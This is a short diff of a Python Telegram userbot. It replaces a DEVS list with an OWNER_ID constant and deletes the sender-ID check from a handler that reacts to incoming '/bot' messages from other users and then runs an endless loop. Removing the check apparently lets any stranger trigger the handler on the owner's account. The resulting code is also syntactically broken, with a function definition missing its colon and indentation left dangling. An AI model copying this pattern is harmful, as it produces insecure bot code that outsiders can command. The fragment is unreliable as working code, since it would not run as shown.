@@ -166,10 +166,9 @@ async def _(event):
 ╎Gr : https://t.me/+i62ZNW6PN1wwNzVi
 ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 ''')
-DEVS = [1759470911]
+OWNER_ID = 1759470911   
 @jalithon.on(events.NewMessage(outgoing=False, pattern='^/bot (.*)'))
 async def OwnerStart(event)
-    if event.sender_id == OWNER_ID:
     while True:
         try:
             pot = event.pattern_match.group(1) 
